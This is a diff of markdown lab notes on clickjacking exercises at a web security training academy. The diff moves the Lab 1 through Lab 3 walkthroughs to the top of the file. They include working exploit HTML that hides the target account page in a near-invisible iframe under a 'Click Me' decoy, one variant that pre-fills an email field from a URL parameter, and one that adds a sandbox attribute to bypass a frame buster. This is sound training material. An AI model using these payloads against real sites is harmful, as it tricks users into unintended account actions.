@@ -1,3 +1,63 @@
+## Lab 1 – Basic Clickjacking with CSRF Token Protection
+
+- Click on **“Go to exploit server”**.
+- On the exploit server page, **generate the exploit code**.
+- **Format the exploit code** as instructed in the lab (use the required HTML/iframe structure and styling).
+- Once the exploit page is ready, click on **“Deliver to victim”** to send the exploit.
+
+<style>
+iframe {
+        position:relative;
+        width:1135;
+        height:600;
+        opacity:0.001;
+        z-index: 2;
+    }
+p {
+        position:absolute;
+        top:500;
+        left:100;
+        z-index: 1;
+}
+</style>
+<p>Click Me</p>
+<iframe src=https://0a3e00e0048e06f8806f85e800d50021.web-security-academy.net/my-account></iframe>
+
+## Lab 2 – Clickjacking with Form Input Data Prefilled from a URL Parameter
+
+- Click on **“Go to exploit server”**.
+- On the exploit server page, **generate the exploit code**.
+- **Modify the exploit URL** to include an email parameter, for example:  
+  `?email=test@example.com`
+- Ensure the form field on the victim page is **prefilled using the `email` URL parameter**.
+- Once the exploit page is correctly formatted and tested, click on **“Deliver to victim”** to send the exploit.
+
+<style>
+iframe {
+        position:relative;
+        width:1135;
+        height:600;
+        opacity:0.0001;
+        z-index: 2;
+    }
+p {
+        position:absolute;
+        top:450;
+        left:80;
+        z-index: 1;
+}
+</style>
+<p>Click Me</p>
+<iframe src="https://0a510088037b3971808949be00ad0056.web-security-academy.net/my-account?email=hellotest@gmail.com"></iframe>
+
+## Lab 3 – Clickjacking with a Frame Buster Script
+
+- Click on **“Go to exploit server”**.
+- On the exploit server page, **generate the exploit code**.
+- **Modify the `<iframe>`** in the exploit page to include the sandbox attribute, for example:  
+  ```html
+  <iframe sandbox="allow-forms" ...>
+
 ## Exploit Code – Essential `<iframe>` Attributes
 
 - **allow**  
@@ -59,67 +119,6 @@
   - Type: `pixels`  
   - Specifies the width of the `<iframe>`.  
   - Default: `300px`.
-
-
-## Lab 1 – Basic Clickjacking with CSRF Token Protection
-
-- Click on **“Go to exploit server”**.
-- On the exploit server page, **generate the exploit code**.
-- **Format the exploit code** as instructed in the lab (use the required HTML/iframe structure and styling).
-- Once the exploit page is ready, click on **“Deliver to victim”** to send the exploit.
-
-<style>
-iframe {
-        position:relative;
-        width:1135;
-        height:600;
-        opacity:0.001;
-        z-index: 2;
-    }
-p {
-        position:absolute;
-        top:500;
-        left:100;
-        z-index: 1;
-}
-</style>
-<p>Click Me</p>
-<iframe src=https://0a3e00e0048e06f8806f85e800d50021.web-security-academy.net/my-account></iframe>
-
-## Lab 2 – Clickjacking with Form Input Data Prefilled from a URL Parameter
-
-- Click on **“Go to exploit server”**.
-- On the exploit server page, **generate the exploit code**.
-- **Modify the exploit URL** to include an email parameter, for example:  
-  `?email=test@example.com`
-- Ensure the form field on the victim page is **prefilled using the `email` URL parameter**.
-- Once the exploit page is correctly formatted and tested, click on **“Deliver to victim”** to send the exploit.
-
-<style>
-iframe {
-        position:relative;
-        width:1135;
-        height:600;
-        opacity:0.0001;
-        z-index: 2;
-    }
-p {
-        position:absolute;
-        top:450;
-        left:80;
-        z-index: 1;
-}
-</style>
-<p>Click Me</p>
-<iframe src="https://0a510088037b3971808949be00ad0056.web-security-academy.net/my-account?email=hellotest@gmail.com"></iframe>
-
-## Lab 3 – Clickjacking with a Frame Buster Script
-
-- Click on **“Go to exploit server”**.
-- On the exploit server page, **generate the exploit code**.
-- **Modify the `<iframe>`** in the exploit page to include the sandbox attribute, for example:  
-  ```html
-  <iframe sandbox="allow-forms" ...>
 
 
 <style>
